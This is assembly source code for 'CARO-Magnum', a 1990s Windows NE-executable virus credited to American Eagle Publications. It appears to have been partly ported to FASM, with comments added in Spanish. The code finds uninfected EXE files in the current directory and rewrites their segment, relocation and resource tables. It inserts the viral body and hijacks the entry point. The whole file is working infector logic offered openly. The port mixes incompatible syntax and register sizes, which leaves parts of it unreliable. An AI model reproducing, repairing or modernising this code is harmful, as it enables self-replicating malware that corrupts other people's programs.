
format PE GUI 4.0

;include 'win32a.inc'
;include 'kernel32.lib'
;include 'user32.lib'
;include 'gdi32.lib'
include 'win32ax.inc'
;CARO.ASM: CARO-Magnum, a Windows virus. Launched as a Windows EXE file. This
;demonstrates the use of DPMI and the Windows API in a virus.
;(C) 1995 American Eagle Publications, Inc. All rights reserved.

entry VIRUS

section '.text' code readable executable

VIRUS:
;Useful constants
DATABUF_SIZE EQU 4096 ;size of read/write buf
NEW_HDR_SIZE EQU 40H ;size of new EXE header
VIRUS_SIZE EQU OFFSET END_VIRUS - OFFSET VIRUS ;size of virus

 extrn PostQuitMessage : PROC
 EXTRN _lopen:FAR, _lread:FAR, _lwrite:FAR, _llseek:FAR, _lclose:FAR

.code
_CODE db  'CODE'

 PUBLIC VIRUS
;******************************************************************************
;This is the main virus routine. It simply finds a file to infect and infects
;it, and then passes control to the host program. It resides in the first
;segment of the host program, that is, the segment where control is initially
;passed.
VIRUS PROC FAR
 pushf
 push ax ;save all registers
 push bx
 push cx
 push dx
 push si
 push di
 push bp
 push ds

 push es
 call CREATE_DS ;create the data segment
 call VIR_START ;find starting offset of virus
VIR_START:
 pop si
 sub esi,OFFSET VIR_START
 mov [VSTART],esi
 call INIT_DS
 call FIND_FILE ;find a viable file to infect
 jnz SHORT GOTO_HOST ;z set if a file was found
 call INFECT_FILE ;infect it if found
GOTO_HOST:
 call DESTROY_DS ;clean up memory
 pop es
 pop ds
 pop bp
 pop di
 pop si
 pop dx
 pop cx
 pop bx
 pop ax
 popf
VIRUS_DONE:
 jmp HOST ;pass control to host program
VIRUS ENDP
VIRUS_ENDP:
 db '(C) 1995 American Eagle Publications Inc., All rights reserved.'
;This routine creates a data segment for the virus. To do that, it
;(1) allocates memory for the virus (2) creates a data segment for that memory
;(3) sets up ds and es with this new selector, and (4) saves the handle for
;the memory so it can be freed when done.
CREATE_DS:
 mov ax,501H ;first allocate a block of memory
 xor bx,bx
 mov cx,OFFSET DATAEND - OFFSET DATASTART
 int 31H ;using DPMI
 push si ;put handle on stack
 push di
 push bx ;put linear address on stack
 push cx
 mov ax,0 ;now allocate a descriptor for the block
 mov cx,1
 int 31H
 mov bx,ax ;set segment base address
 mov ax,7
 pop dx
 pop cx
 int 31H
 mov ax,8 ;set segment limit
 mov dx,OFFSET DATAEND - OFFSET DATASTART
 xor cx,cx
 int 31H
 mov ax,9 ;now set access rights
 mov cx,0000000011110010B ;read/write data segment
 int 31H
 mov ds,bx ;and set up selectors
 mov es,bx
 pop di
 pop si

 mov WORD PTR [MEM_HANDLE],si ;save handle here
 mov WORD PTR [MEM_HANDLE+2],di
 ret
 CFILE_ID1 DB '*.EXE',0
 CFILE_ID2 DB '*.DLL',0
 CKNAME DB 'KERNEL'
;Initialize data in data segment.
INIT_DS:
 mov esi,OFFSET CFILE_ID1 ;move constant strings to ds
 add esi,[VSTART]
 mov edi,OFFSET FILE_ID1
 mov cx,OFFSET INIT_DS - OFFSET CFILE_ID1
 CDL: mov al,cs:[esi]
 inc si
 stosb
 loop CDL
 ret ;all done
;This routine frees the memory allocated by CREATE_DS.
DESTROY_DS:
 mov si,WORD PTR [MEM_HANDLE] ;get handle
 mov di,WORD PTR [MEM_HANDLE+2]
 mov ax,502H ;free memory block
 int 31H ;using DPMI
 ret
;******************************************************************************
;This routine searches for a file to infect. It looks for EXE files and then
;checks them to see if they?re uninfected, infectable Windows files. If a file
;is found, this routine returns with Z set, with the file left open, and its
;handle in the bx register. This FIND_FILE searches only the current directory.
FIND_FILE:
 mov edx,OFFSET FILE_ID1
 xor cx,cx ;file attribute
 mov ah,4EH ;search first
 int 21H
FIND_LOOP:
 or al,al ;see if search successful
 jnz SHORT FIND_EXIT ;nope, exit with NZ set
 call FILE_OK ;see if it is infectable
 jz SHORT FIND_EXIT ;yes, get out with Z set
 mov ah,4FH ;no, search for next file
 int 21H
 jmp FIND_LOOP
FIND_EXIT: ;pass control back to main routine
 ret
;This routine determines whether a file is ok to infect. The conditions for an
;OK file are as follows:
;
; (1) It must be a Windows EXE file.
; (2) There must be enough room in the initial code segment for it.
; (3) The file must not be infected already.
;
;If the file is OK, this routine returns with Z set, the file open, and the
;handle in bx. If the file is not OK, this routine returns with NZ set, and
;it closes the file. This routine also sets up a number of important variables
;as it snoops through the file. These are used by the infect routine later.
FILE_OK:
 mov ah,2FH
 int 21H ;get current DTA address in es:bx
 push es
 push ds
 pop es
 pop ds ;exchange ds and es

 mov si,bx ;put address in ds:dx
 add si,30 ;set ds:dx to point to file name
 mov edi,OFFSET FILE_NAME
 mov cx,13
 rep movsb ;put file name in data segment
 push es ;restore ds now
 pop ds
 mov edx,OFFSET FILE_NAME
 call FILE_OPEN ;open the file
 or ax,ax
 jnz SHORT FOK1
 jmp FOK_ERROR2 ;yes, exit now
FOK1: mov bx,ax ;open ok, put handle in bx
 mov edx,OFFSET NEW_HDR ;ds:dx points to header buffer
 mov cx,40H ;read 40H bytes
 call FILE_READ ;ok, read EXE header
 cmp WORD PTR [NEW_HDR],5A4DH;see if first 2 bytes are ?MZ?
 jnz SHORT FN1 ;nope, file not an EXE, exit
 cmp WORD PTR [NEW_HDR+18H],40H ;see if rel tbl at 40H or more
 jc SHORT FN1 ;nope, it can?t be a Windows EXE
 mov dx,WORD PTR [NEW_HDR+3CH] ;ok, put offset to new header in dx
 mov [NH_OFFSET],dx ;and save it here
 xor cx,cx
 call FILE_SEEK_ST ;now do a seek from start
 mov cx,NEW_HDR_SIZE ;now read the new header
 mov edx,OFFSET NEW_HDR
 call FILE_READ
 cmp WORD PTR [NEW_HDR],454EH ;see if this is ?NE? new header ID
 jnz SHORT FN1 ;nope, not a Windows EXE!
 mov al,[NEW_HDR+36H] ;get target OS flags
 and al,2 ;see if target OS = windows
 jnz SHORT FOK2 ;ok, go on
FN1: jmp FOK_ERROR1 ;else exit
;If we get here, then condition (1) is fulfilled.
FOK2: mov dx,WORD PTR [NEW_HDR+16H] ;get initial cs
 call GET_SEG_ENTRY ;and read seg table entry into disk buf
 mov ax,WORD PTR [TEMP+2] ;put segment length in ax
 add ax,VIRUS_SIZE ;add size of virus to it
 jc SHORT FOK_ERROR1 ;if we carry, there?s not enough room
 ;else we?re clear on this count
;If we get here, then condition (2) is fulfilled.
 mov cx,WORD PTR [NEW_HDR+32H] ;logical sector alignment
 mov ax,1
 shl ax,cl ;ax=logical sector size
 mov cx,WORD PTR [TEMP] ;get logical-sector offset of start seg
 mul cx ;byte offset in dx:ax
 add ax,WORD PTR [NEW_HDR+14H] ;add in ip of entry point
 adc edx,0
 mov cx,dx
 mov dx,ax ;put entry point in cx:dx
 call FILE_SEEK_ST ;and seek from start of file
 mov cx,20H ;read 32 bytes
 mov edx,OFFSET TEMP ;into buffer
 call FILE_READ
 mov esi,[VSTART]
 mov edi,OFFSET TEMP
 mov cx,10H ;compare 32 bytes
 FOK3: mov ax,cs:[esi]
 add si,2
 cmp ax,ds:[edi]
 jne SHORT FOK4
 add di,2
 loop FOK3
FOK_ERROR1:
 call FILE_CLOSE

FOK_ERROR2:
 mov al,1
 or al,al ;set NZ
 ret ;and return to caller
;If we get here, then condition (3) is fulfilled, all systems go!
FOK4: xor al,al ;set Z flag
 ret ;and exit
;******************************************************************************
;This routine modifies the file we found to put the virus in it. There are a
;number of steps in the infection process, as follows:
; 1) We have to modify the segment table. For the initial segment, this
; involves (a) increasing the segment size by the size of the virus,
; and (b) increase the minimum allocation size of the segment, if it
; needs it. Every segment AFTER this initial segment must also be
; adjusted by adding the size increase, in sectors, of the virus
; to it.
; 2) We have to change the starting ip in the new header. The virus is
; placed after the host code in this segment, so the new ip will be
; the old segment size.
; 3) We have to move all sectors in the file after the initial code segment
; out by VIRSECS, the size of the virus in sectors.
; 4) We have to move the relocatables, if any, at the end of the code
; segment we are infecting, to make room for the virus code. Then we
; must add the viral relocatables to the relocatable table.
; 5) We must move the virus code into the code segment we are infecting.
; 6) We must adjust the jump in the virus to go to the original entry point.
; 7) We must adjust the resource offsets in the resource table to reflect
; their new locations.
; 8) We have to kill the fast-load area.
;
INFECT_FILE:
 mov dx,WORD PTR [NEW_HDR+24H] ;get resource table @
 add dx,ds:[NH_OFFSET]
 xor cx,cx
 call FILE_SEEK_ST
 mov edx,OFFSET LOG_SEC
 mov cx,2
 call FILE_READ
 mov cx,[LOG_SEC]
 mov ax,1
 shl ax,cl
 mov [LOG_SEC],ax ;put logical sector size here
 mov ax,WORD PTR [NEW_HDR+14H] ;save old entry point
 mov [ENTRYPT],ax ;for future use
 mov dx,WORD PTR [NEW_HDR+16H] ;read seg table entry
 call GET_SEG_ENTRY ;for initial cs
 mov ax,WORD PTR [TEMP] ;get location of this seg in file
 mov [INITSEC],ax ;save that here
 mov ax,WORD PTR [TEMP+2] ;get segment size
 mov WORD PTR [NEW_HDR+14H],ax ;update entry ip in new header in ram
 call SET_RELOCS ;set up RELOCS and CS_SIZE
 mov esi,[VSTART]
 mov eax, ARELOCS     ; Carga el valor de ARELOCS en eax
 mov ebx, 4           ; Tama?o de cada entrada de relocatables en bytes (DWORD)
 mul ebx              ; Multiplica eax por ebx, el resultado estar? en edx:eax
 add esi, eax         ; Agrega el resultado a esi para obtener la direcci?n correcta
 mov eax,cs:[esi+ARELOCS] ;now calculate added size of segment
 shl ax,3 ;multiply ARELOCS by 8
 add ax,VIRUS_SIZE
 add ax,[CS_SIZE] ;ax=total new size
 xor dx,dx
 mov cx,[LOG_SEC]
 div cx ;ax=full sectors in cs with virus
 or dx,dx ;any remainder?
 jz SHORT INF05

 inc ax ;adjust for partially full sector
INF05: push ax
 mov ax,[CS_SIZE] ;size without virus
 xor dx,dx
 div cx
 or dx,dx
 jz SHORT INF07
 inc ax
INF07: pop cx
 sub cx,ax ;cx=number of secs needed for virus
 mov [VIRSECS],cx ;save this here
 call UPDATE_SEG_TBL ;perform mods in (1) above on file
 mov dx,[NH_OFFSET]
 xor cx,cx
 call FILE_SEEK_ST ;now move file pointer to new header
 mov edi,OFFSET NEW_HDR + 37H ;zero out fast load area
 xor ax,ax
 stosb
 stosw
 stosw ;(8) completed
 mov edx,OFFSET NEW_HDR
 mov cx,NEW_HDR_SIZE ;update new header in file
 call FILE_WRITE ;mods in (2) above now complete
 call MOVE_END_OUT ;move end of virus out by VIRSECS (3)
 ;also sets up RELOCS count
 call SETUP_KERNEL ;put KERNEL module into virus relocs
 call RELOCATE_RELOCS ;relocate relocatables in cs (4)
INF1: call WRITE_VIRUS_CODE ;put virus into cs (5 & 6)
 call UPDATE_RES_TABLE ;update resource table entries
 call FILE_CLOSE ;close file now
INF2: ret
;The following procedure updates the Segment Table entries per item (1) in
;INFECT_FILE.
UPDATE_SEG_TBL:
 mov dx,WORD PTR [NEW_HDR+16H] ;read seg table entry
 call GET_SEG_ENTRY ;for initial cs
 mov ax,WORD PTR [TEMP+2] ;get seg size
 add ax,VIRUS_SIZE ;add the size of the virus to seg size
 mov WORD PTR [TEMP+2],ax ;and update size in seg table
 mov ax,WORD PTR [TEMP+6] ;get min allocation size of segment
 or ax,ax ;is it 64K?
 jz SHORT US2 ;yes, leave it alone
US1: add ax,VIRUS_SIZE ;add virus size on
 jnc SHORT US2 ;no overflow, go and update
 xor ax,ax ;else set size = 64K
US2: mov WORD PTR [TEMP+6],ax ;update size in table in ram
 mov al,1
 mov cx,0FFFFH
 mov dx,-8
 call FILE_SEEK ;back up to location of seg table entry
 mov edx,OFFSET TEMP ;and write modified seg table entry
 mov cx,8 ;for initial cs to segment table
 call FILE_WRITE ;ok, init cs seg table entry is modified
 mov di,WORD PTR [NEW_HDR+1CH] ;get number of segment table entries
US3: push di ;save table entry counter
 mov dx,di ;dx=seg table entry # to read
 call GET_SEG_ENTRY ;read it into disk buffer
 mov ax,WORD PTR [TEMP] ;get offset of this segment in file

 cmp ax,[INITSEC] ;higher than initial code segment?
 jle SHORT US4 ;nope, don?t adjust
 add ax,[VIRSECS] ;yes, add the size of virus in
US4: mov WORD PTR [TEMP],ax ;adjust segment loc in memory
 mov al,1
 mov cx,0FFFFH
 mov dx,-8
 call FILE_SEEK ;back up to location of seg table entry
 mov edx,OFFSET TEMP
 mov cx,8
 call FILE_WRITE ;and write modified seg table entry
 pop di ;restore table entry counter
 dec di
 jnz US3 ;and loop until all segments done
 ret ;all done
;This routine goes to the segment table entry number specified in dx in the
;file and reads it into the TEMP buffer. dx=1 is the first entry!
GET_SEG_ENTRY:
 dec dx
 mov cl,3
 shl dx,cl
 add dx,[NH_OFFSET]
 add dx,WORD PTR [NEW_HDR+22H] ;dx=ofs of seg table entry requested
 xor cx,cx ;in the file
 call FILE_SEEK_ST ;go to specified table entry
 jc SHORT GSE1 ;exit on error
 mov edx,OFFSET TEMP
 mov cx,8
 call FILE_READ ;read table entry into disk buf
GSE1: ret
;This routine moves the end of the virus out by VIRSECS. The ?end? is
;everything after the initial code segment where the virus will live.
;The variable VIRSECS is assumed to be properly set up before this is called.
MOVE_END_OUT:
 mov ax,[CS_SIZE] ;size of cs in bytes, before infect
 mov cx,[LOG_SEC]
 xor dx,dx
 div cx
 or dx,dx
 jz SHORT ME01
 inc ax
ME01: add ax,[INITSEC] ;ax=next sector after cs
 push ax ;save it
 xor dx,dx
 xor cx,cx
 mov al,2 ;seek end of file
 call FILE_SEEK ;returns dx:ax = file size
 mov cx,[LOG_SEC]
 div cx ;ax=sectors in file
 or dx,dx
 jz ME015 ;adjust for extra bytes
 inc ax
ME015: mov dx,ax ;keep it here
 pop di ;di=lowest sector to move
 sub dx,di ;dx=number of sectors to move
MEO2: push dx
 push di
 call MOVE_SECTORS ;move as much as data buffer allows
 pop di ;number moved returned in ax
 pop dx
 sub dx,ax

 or dx,dx
 jnz MEO2
 ret
;This routine moves as many sectors as buffer will permit, up to the number
;requested. On entry, dx=maximum number of sectors to move, and di=lowest
;sector number to move. This routine works from the end of the file, so if
;X is the number of sectors to be moved, it will move all the sectors from
;di+dx-X to di+dx-1. All sectors are move out by [VIRSECS].
MOVE_SECTORS:
 push dx ;first determine # of secs to move
 mov ax,DATABUF_SIZE
 mov cx,[LOG_SEC]
 xor dx,dx
 div cx ;ax=data buf size in logical sectors
 pop dx
 cmp ax,dx ;is ax>dx? (max sectors to move)
 jle SHORT MS1
 mov ax,dx ;ax=# secs to move now
MS1: push ax ;save it till end
 add di,dx
 sub di,ax ;di=1st sector to move
 mov cx,[LOG_SEC]
 mul cx ;ax=bytes to move this time
 push ax ;save it on stack
 mov ax,di
 mov cx,[LOG_SEC]
 mul cx
 mov cx,dx
 mov dx,ax
 call FILE_SEEK_ST ;seek starting sector to move
 pop cx ;cx=bytes to read
 push cx
 mov edx,OFFSET TEMP
 call FILE_READ ;and read it
 mov ax,di
 add ax,[VIRSECS] ;ax=location to move to, in secs
 mov cx,[LOG_SEC]
 mul cx ;dx:ax=loc to move to, in bytes
 mov cx,dx ;set up seek function
 mov dx,ax
 call FILE_SEEK_ST ;and move there
 pop cx ;bytes to write
 mov edx,OFFSET TEMP
 call FILE_WRITE ;and write proper number of bytes there
 pop ax ;report sectors moved this time
 ret
;This routine sets the variable RELOCS and CS_SIZE variables in memory from the
;uninfected file. Then it updates the relocs counter in the file to add the
;number of relocatables required by the virus.
SET_RELOCS:
 mov WORD PTR [RELOCS],0
 mov dx,WORD PTR [NEW_HDR+16H] ;read init cs seg table entry
 call GET_SEG_ENTRY
 mov ax,WORD PTR [TEMP+4] ;get segment flags
 xor dx,dx
 and ah,1 ;check for relocation data
 mov ax,WORD PTR [NEW_HDR+14H] ;size of segment is this
 jz  SRE ;no data, continue
 push ax
 push ax ;there is relocation data, how much?

 mov ax,[INITSEC] ;find end of code in file
 mov cx,[LOG_SEC]
 mul cx ;dx:ax = start of cs in file
 pop cx ;cx = size of code
 add ax,cx
 adc dx,0
 mov cx,dx
 mov dx,ax ;cx:dx = end of cs in file
 push cx
 push dx
 call FILE_SEEK_ST ;so go seek it
 mov edx,OFFSET RELOCS
 mov cx,2
 call FILE_READ ;read 2 byte count of relocatables
 pop dx
 pop cx
 call FILE_SEEK_ST ;go back to that location
 mov eax,[RELOCS]
 push ax
 mov esi,[VSTART]
 add eax,cs:[esi+ARELOCS]
 mov [RELOCS],eax
 mov ecx,2
 mov edx,OFFSET RELOCS ;and update relocs in the file
 call FILE_WRITE ;adding arelocs to it
 pop [RELOCS]
 mov eax,[RELOCS]
 shl ax,3
 add ax,2 ;size of relocation data
 pop cx ;size of code in segment
 xor dx,dx
 add ax,cx ;total size of segment
 adc dx,0
SRE: mov [CS_SIZE],ax ;save it here
 ret
;This routine relocates the relocatables at the end of the initial code
;segment to make room for the virus. It will move any number of relocation
;records, each of which is 8 bytes long. It also adds the new relocatables
;for the virus to the file.
RELOCATE_RELOCS:
 mov eax,[RELOCS] ;number of relocatables
 mov cl,3
 shl ax,cl
 add ax,2 ;ax=total number of bytes to move
 push ax
 mov ax,[INITSEC]
 mov cx,[LOG_SEC]
 mul cx ;dx:ax = start of cs in file
 add ax,WORD PTR [NEW_HDR+14H]
 adc dx,0 ;dx:ax = end of cs in file
 pop cx ;cx = size of relocatables
 add ax,cx
 adc dx,0 ;dx:ax = end of code+relocatables
 xchg ax,cx
 xchg dx,cx ;ax=size cx:dx=location
RR_LP: push cx
 push dx
 push ax
 cmp ax,DATABUF_SIZE
 jle SHORT RR1
 mov ax,DATABUF_SIZE ;read up to DATABUF_SIZE bytes
RR1: sub dx,ax ;back up file pointer
 sbb cx,0
 push cx
 push dx
 push ax

 call FILE_SEEK_ST ;seek desired location in file
 pop cx
 mov edx,OFFSET TEMP
 call FILE_READ ;read needed number of bytes, # in ax
 pop dx
 pop cx
 push ax ;save # of bytes read
 add dx,VIRUS_SIZE ;move file pointer up now
 adc cx,0
 call FILE_SEEK_ST
 pop cx ;bytes to write
 mov edx,OFFSET TEMP
 call FILE_WRITE ;write them to new location
 pop ax
 pop dx
 pop cx
 cmp ax,DATABUF_SIZE ;less than DATABUF_SIZE bytes to write?
 jle SHORT RRE ;yes, we?re all done
 sub ax,DATABUF_SIZE ;nope, adjust indicies
 sub dx,DATABUF_SIZE
 sbb cx,0
 jmp RR_LP ;and go do another
 RRE: mov esi,[VSTART]
 mov ecx,cs:[esi+ARELOCS] ;now add ARELOCS relocatables to the end
 push si
 mov edi,OFFSET TEMP
 add esi,OFFSET ARELOCS + 2 ;si points to relocatable table
 RRL: mov ax,cs:[esi] ;move relocatables to buffer and adjust
 stosw
 add si,2
 mov ax,cs:[esi]
 add si,2
 add ax,WORD PTR [NEW_HDR+14H] ;add orig code size to the offset here
 stosw
 mov ax,[KERNEL] ;put kernel module ref no next
 add si,2
 stosw
 mov ax,cs:[esi]
 add si,2
 stosw
 loop RRL
 pop si
 mov edx,OFFSET TEMP
 mov ecx,cs:[esi+ARELOCS]
 shl cx,3
 call FILE_WRITE ;and put them in the file
 ret
;This routine finds the KERNEL module in the module reference table, and puts
;it into the virus relocation records.
SETUP_KERNEL:
 xor cx,cx
 mov dx,WORD PTR [NEW_HDR+28H] ;go to start of module ref tbl
 add dx,[NH_OFFSET]
 adc cx,0
 call FILE_SEEK_ST
 mov edx,OFFSET TEMP
 mov cx,40H ;read up to 32 module ofs?s to
 call FILE_READ ;the TEMP buffer
 mov esi,OFFSET TEMP
SK1: lodsw ;get a module offset
 push si
 mov dx,[NH_OFFSET] ;lookup in imported name tbl
 add dx,WORD PTR [NEW_HDR+2AH]
 add dx,ax
 inc dx
 xor cx,cx
 call FILE_SEEK_ST ;prep to read module name

 mov cx,40H
 mov edx,OFFSET TEMP + 40H
 call FILE_READ ;read it into TEMP at 40H
 pop ax
 push ax
 sub eax,OFFSET TEMP
 shr ax,1
 mov [KERNEL],ax ;assume this is KERNEL
 cmp ax,WORD PTR [NEW_HDR+1EH] ;last entry?
 jge SHORT SK2 ;yes, use it by default
 mov edi,OFFSET TEMP + 40H
 mov esi,OFFSET KNAME
 mov cx,6
 repz cmpsb ;check it
 jnz SHORT SK3 ;wasn?t it, continue
SK2: pop si ;else exit with KERNEL set as is
 ret
SK3: pop si
 jmp SK1
;This routine writes the virus code itself into the code segment being infected.
;It also updates the jump which exits the virus so that it points to the old
;entry point in this segment.
WRITE_VIRUS_CODE:
 mov ax,[INITSEC] ;sectors to code segment
 mov cx,[LOG_SEC]
 mul cx ;dx:ax = location of code seg
 add ax,WORD PTR [NEW_HDR+14H]
 adc dx,0 ;dx:ax = place to put virus
 mov cx,dx
 mov dx,ax
 push cx
 push dx ;save these to adjust jump
 call FILE_SEEK_ST ;seek there
 mov edi,OFFSET TEMP ;move virus code to data segment now
 mov cx,VIRUS_SIZE
 mov esi,[VSTART]
 WVCL: mov al,cs:[esi]
 inc si
 stosb
 loop WVCL
 mov esi,[VSTART] ;now set relocatable areas in code to
 add esi,OFFSET ARELOCS ;FFFF 0000
 mov cx,cs:[esi]
 add si,4
 WVC2: mov di,cs:[esi]
 add edi,OFFSET TEMP
 mov ax,0FFFFH
 stosw
 inc ax
 stosw
 add si,8
 loop WVC2
 mov cx,VIRUS_SIZE ;cx=size of virus
 mov edx,OFFSET TEMP ;dx=offset of start of virus
 call FILE_WRITE ;write virus to file now
 pop dx ;ok, now we have to update the jump
 pop cx ;to the host
 mov ax,OFFSET VIRUS_ENDP  - OFFSET VIRUS
 sub ax,2 ;jmp host
 inc ax
 add dx,ax
 adc cx,0 ;cx:dx=location to update
 push ax
 call FILE_SEEK_ST ;go there

 pop ax
 inc ax
 inc ax
 add ax,WORD PTR [NEW_HDR+14H] ;ax=offset of instr after jump
 sub ax,[ENTRYPT] ;ax=distance to jump
 neg ax ;make it a negative number
 mov WORD PTR [TEMP],ax ;save it here
 mov cx,2 ;and write it to disk
 mov edx,OFFSET TEMP
 call FILE_WRITE ;all done
 ret
;Update the resource table so sector pointers are right.
UPDATE_RES_TABLE:
 mov dx,WORD PTR [NEW_HDR+24H] ;move to resource table in EXE
 add dx,[NH_OFFSET]
 add dx,2
 xor cx,cx
 call FILE_SEEK_ST
URT1:
 mov edx,OFFSET TEMP
 mov cx,8
 call FILE_READ ;read 8 byte typeinfo record
 cmp WORD PTR [TEMP],0 ;is type ID 0?
 jz SHORT URTE ;yes, all done
 mov cx,WORD PTR [TEMP+2] ;get count of nameinfo records to read
URT2: push cx
 mov edx,OFFSET TEMP
 mov cx,12
 call FILE_READ ;read 1 nameinfo record
 mov ax,WORD PTR [TEMP] ;get offset of resource
 cmp ax,[INITSEC] ;greater than initial cs location?
 jle SHORT URT3 ;nope, don?t worry about it
 add ax,[VIRSECS] ;add size of virus
 mov WORD PTR [TEMP],ax
 mov dx,-12
 mov cx,0FFFFH
 mov al,1 ;now back file pointer up
 call FILE_SEEK
 mov edx,OFFSET TEMP ;and write updated resource rec to
 mov cx,12 ;the file
 call FILE_WRITE
URT3: pop cx
 dec cx ;read until all nameinfo records for
 jnz URT2 ;this typeinfo are done
 jmp URT1 ;go get another typeinfo record
URTE: ret
;******************************************************************************
;Calls to KERNEL-based file i/o go here.
FILE_OPEN:
 push es
 push ds ;push pointer to file name
 push dx
 push 2 ;open in read/write mode
ROPEN: call FAR PTR _lopen
; DB 09AH ;call far ptr _lopen
;ROPEN: DW 0FFFFH,0
 pop es
 ret ;return with handle in ax

FILE_READ:
 push es
 push bx ;preserve bx through this call
 push bx ;and pass handle to _lread
 push ds
 push dx ;buffer to read to
 push cx ;bytes to read
RREAD: call FAR PTR _lread
; DB 09AH ;call far ptr _lread
;RREAD: DW 0FFFFH,0
 pop bx
 pop es
 ret
FILE_WRITE:
 push es
 push bx ;preserve bx through this call
 push bx ;and pass handle to _lwrite
 push ds
 push dx ;buffer to write from
 push cx ;bytes to write
RWRITE: call FAR PTR _lwrite
; DB 09AH ;call far ptr _lwrite
;RWRITE: DW 0FFFFH,0
 pop bx
 pop es
 ret
FILE_SEEK_ST:
 xor al,al
FILE_SEEK:
 push es
 push bx ;preserve bx in this call
 push bx ;and push for call
 push cx
 push dx ;number of bytes to move
 xor ah,ah ;ax=origin to seek from
 push ax ;0=beginning, 1=current, 2=end
RSEEK: call FAR PTR _llseek
; DB 09AH ;call far ptr _llseek
;RSEEK: DW 0FFFFH,0
 pop bx
 pop es
 ret
FILE_CLOSE:
 push bx ;pass handle to _lclose
RCLOSE: call FAR PTR _lclose
; DB 09AH ;call far ptr _lclose
;RCLOSE: DW 0FFFFH,0
 ret
;******************************************************************************
;The following HOST is only here for the inital startup program. Once the virus
;infects a file, the virus will jump to the startup code for the program it
;is attached to.
HOST:
 push 0
 call FAR PTR PostQuitMessage ;terminate program (USER)
;The following are the relocatables added to the relocation table in this
;sector in order to accomodate the virus. This must be the last thing in the
;code segment in order for the patch program to work properly.
ARELOCS DD 0,0,0,5 ;number of relocatables to add
R_OPEN DD OFFSET ROPEN+1
       DW 1
       DW 85
R_READ DD OFFSET RREAD+1
       DW 1
       DW 82

R_WRITE DD OFFSET RWRITE+1
        DW 1
        DW 86
R_SEEK DD OFFSET RSEEK+1
       DW 1
       DW 84
R_CLOSE DD OFFSET RCLOSE+1
        DW 1
        DW 81
;******************************************************************************
END_VIRUS: ;label for the end of the windows virus

;No data is hard-coded into the data segment since in Windows, the virus must
;allocate the data segment when it runs. As such, we must assume it will be
;filled with random garbage when the program starts up. The CREATE_DS routine
;below initializes some of the data used in this segment that would be
;hard-coded in a normal program.
.DATA
;_DATA db  'DATA'
DATASTART EQU $
FILE_ID1 DB 6 dup (?) ;for searching for files
FILE_ID2 DB 6 dup (?) ;for searching for files
KNAME DB 6 dup (?) ;"KERNEL"
FILE_NAME DB 13 dup (?) ;file name
VSTART DD ? ;starting offset of virus in ram
ENTRYPT DW ? ;initial ip of virus start
NH_OFFSET DW ? ;new hdr offs from start of file
VIRSECS DW ? ;secs added to file for virus
INITSEC DW ? ;init cs loc in file (sectors)
RELOCS DD ? ;number of relocatables in cs
LOG_SEC DW ? ;logical sector size for program
CS_SIZE DW ? ;code segment size
KERNEL DW ? ;KERNEL module number
MEM_HANDLE DD ? ;memory handle for data segment
NEW_HDR DB NEW_HDR_SIZE dup (?) ;space to put new exe header in
TEMP DB DATABUF_SIZE dup (?) ;temporary data storage
DATAEND EQU $


_STACK db 'STACK'
; Definir el tama?o m?ximo del stack
MAX_STACK_SIZE equ 100
 END VIRUS